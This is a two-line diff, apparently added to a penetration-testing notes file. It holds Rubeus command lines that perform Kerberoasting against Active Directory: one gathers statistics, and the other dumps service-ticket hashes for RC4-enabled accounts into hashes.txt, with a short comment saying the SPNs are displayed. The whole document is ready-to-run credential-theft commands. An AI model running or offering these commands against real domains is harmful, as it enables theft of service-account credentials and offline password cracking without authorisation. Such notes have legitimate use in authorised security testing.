@@ -1,0 +1,2 @@
+Rubeus.exe kerberoast /stats /rc4opsec
+Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt ( SPN will be deisplayed for accounts)
